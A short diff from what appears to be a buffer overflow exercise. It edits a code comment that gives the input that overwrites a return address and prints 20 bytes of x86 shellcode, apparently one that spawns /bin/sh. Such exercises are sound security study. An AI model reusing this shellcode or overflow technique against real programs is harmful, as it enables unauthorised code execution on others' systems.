@@ -23,7 +23,7 @@
 * run 1234567812345678111111118 - overwrites return address to 0x...38
 * (0x38 is ASCII for character '8') Return address (rip) is being rewritten
 * Check with info registers
-* shellcode:
+* shellcode: 20 bytes
 * unsigned char buf[] = 
 "\x31\xc9\xf7\xe1\xb0\x0b\x68\x2f\x73\x68\x00\x68\x2f\x62"
 "\x69\x6e\x89\xe3\xcd\x80"
